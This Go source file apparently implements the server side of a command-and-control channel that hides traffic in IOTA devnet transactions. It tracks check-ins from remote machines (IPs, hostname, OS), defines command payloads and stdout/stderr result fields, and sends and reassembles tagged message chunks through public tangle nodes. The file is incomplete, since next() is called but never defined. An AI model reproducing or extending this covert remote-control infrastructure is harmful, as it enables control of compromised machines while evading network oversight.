package main

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"os"
	"time"

	"github.com/thanhpk/randstr"

	"github.com/iotaledger/iota.go/address"
	"github.com/iotaledger/iota.go/api"
	"github.com/iotaledger/iota.go/bundle"
	"github.com/iotaledger/iota.go/converter"
)

const iotaMVM = 9
const iotaDepth = 3

var endpoint = []string{
	"https://nodes.devnet.thetangle.org:443",
	"https://altnodes.devnet.iota.org",
	"https://nodes.devnet.iota.org:443",
}

//TODO: log flag

type Machine struct {
	UUID      string   `json:"uuid"`
	PublicKey string   `json:"pubkey"`
	IPs       []string `json:"ips"`
	Hostname  string   `json:"hostname"`
	OS        string   `json:"os"`
	LastSeen  int64    `json:"time"`
	MyTag     string
}

type ConnectionPool struct {
	pool []*api.API
}

type Payload struct {
	ReqType int `json:"rt"`
	// 0 as requset
	// 1 as respone
	ReqJobID    string `json:"r"`
	EncryptData string `json:"d"`
	DataType    int    `json:"dt"`
	// 0 as hello
	// 1 as command
	SentTime int64 `json:"st"`
	Part     int   `json:"p"`
	Total    int   `json:"tt"`
	UUID     string
}

type HelloData struct {
	Info  Machine `json:"info"`
	MyTag string  `json:"tag"`
	OK    bool    `json:"ok"`
}

type CommandData struct {
	Commands              string `json:"cmd"`
	ResultStdoutAndStdErr string `json:"stdout"`
}

var (
	srvTag       string
	srvPublicKey string
	srvPriateKey string
	cliPublicKey string
	cliPriateKey string
	connPool     ConnectionPool
	lastTime     int64
)

func main() {

	rand.Seed(time.Now().UnixNano())

	if len(os.Args) < 2 {
		fmt.Println("No ID")
		return
	}

	lastTime = time.Now().Unix()
	srvTag = os.Args[1]

	for _, v := range endpoint {
		go connPool.Init(v)
	}

	for {
		time.Sleep(100 * time.Millisecond)
		if connPool.GetCount() > 1 {
			break
		}
	}

	next()

}

func (c *ConnectionPool) Init(url string) {

	iriAPI, err := api.ComposeAPI(api.HTTPClientSettings{URI: url})
	nodeInfo, err := iriAPI.GetNodeInfo()

	if err != nil {
		return
	}

	if nodeInfo.Neighbors < 3 {
		return
	}

	c.pool = append(c.pool, iriAPI)
}

func (c *ConnectionPool) GetOne() *api.API {

	n := rand.Intn(len(c.pool))

	return c.pool[n]
}

func (c *ConnectionPool) GetCount() int {

	return len(c.pool)
}

func MarshallPayload(rawJSONStr string, pubkey string, reqtyp int, datatype int) (ps []Payload, ReqJobID string) {

	ReqJobID = randstr.Hex(32)
	now := 0

	for len(rawJSONStr) > 0 {

		p := Payload{}

		if len(rawJSONStr) > 500 {
			p.EncryptData = rawJSONStr[0:500]
			rawJSONStr = rawJSONStr[500:]
		} else {
			p.EncryptData = rawJSONStr
			rawJSONStr = ""
		}

		p.ReqJobID = ReqJobID
		p.ReqType = reqtyp
		p.DataType = datatype
		p.Part = now
		p.SentTime = time.Now().Unix()

		ps = append(ps, p)

		now++
	}

	for i := range ps {
		ps[i].Total = now
	}

	return ps, ReqJobID
}

func genRandAddr() (string, string) {

	iota := connPool.GetOne()
	seed := randstr.String(81, "9ABCDEFGHIJKLMNOPQRSTUVWXYZ")
	addr, _ := iota.GetNewAddress(
		seed,
		api.GetNewAddressOptions{
			Index: rand.Uint64(),
		},
	)

	return seed, string(addr[0])
}

func SendPayload(p []Payload, tag string) string {

	mySeed, myAddr := genRandAddr()
	_, toAddr := genRandAddr()
	iota := connPool.GetOne()

	transfers := bundle.Transfers{}

	for _, v := range p {

		bx, _ := json.Marshal(v)
		dx, _ := converter.ASCIIToTrytes(string(bx))

		transfers = append(transfers, bundle.Transfer{
			Address: myAddr,
			Tag:     tag,
			Message: dx,
		})

	}

	inputs := []api.Input{{Address: toAddr}}

	remainderAddress, _ := address.GenerateAddress(mySeed, 1, 0, true)
	prepTransferOpts := api.PrepareTransfersOptions{
		Inputs:           inputs,
		RemainderAddress: &remainderAddress,
	}

	trytes, _ := iota.PrepareTransfers(mySeed, transfers, prepTransferOpts)
	bndl, _ := iota.SendTrytes(trytes, iotaDepth, iotaMVM)

	fmt.Println("sent tx hash:", bundle.TailTransactionHash(bndl))

	lastTime = time.Now().Unix()

	return bundle.TailTransactionHash(bndl)
}

func getAllTxByTags(tag string) []string {

	query := api.FindTransactionsQuery{
		Tags: []string{tag},
	}

	iota := connPool.GetOne()

	result, _ := iota.FindTransactions(query)

	return result
}

func getStringElementThatOnlyInA(a, b []string) (ret []string) {

	for _, va := range a {

		found := false

		for _, vb := range b {
			if va == vb {
				found = true
			}
		}

		if found == false {
			ret = append(ret, va)
		}
	}

	return ret
}

func getPayloadElementThatOnlyInA(a []Payload, b [][]Payload) (ret []Payload) {

	temp := []Payload{}

	for _, f := range b {
		for _, s := range f {
			temp = append(temp, s)
		}
	}

	for _, va := range a {

		found := false

		for _, vb := range temp {
			if va == vb {
				found = true
			}
		}

		if found == false {
			ret = append(ret, va)
		}
	}

	return ret
}

func processRawTrytes(s string) string {

	for index := len(s) - 1; index >= 0; index-- {
		if s[index] != '9' {
			return s[0 : index+1]
		}
	}

	return ""
}

func getDonePayload(ps []Payload) (nFull []Payload, Full [][]Payload) {

	jobCount := make(map[string]int)

	for _, v := range ps {
		jobCount[v.ReqJobID] = v.Total
	}

	for k, v := range jobCount {

		p := make([]Payload, v)
		nope := false

		for _, v := range ps {
			if v.ReqJobID == k {
				p[v.Part] = v
			}
		}

		blank := Payload{}

		for _, v := range p {
			if v == blank {
				nope = true
			}
		}

		if nope {
			continue
		}

		for index := 1; index < v; index++ {
			p[0].EncryptData += p[index].EncryptData
		}

		Full = append(Full, p)
	}

	nFull = getPayloadElementThatOnlyInA(ps, Full)

	return nFull, Full
}
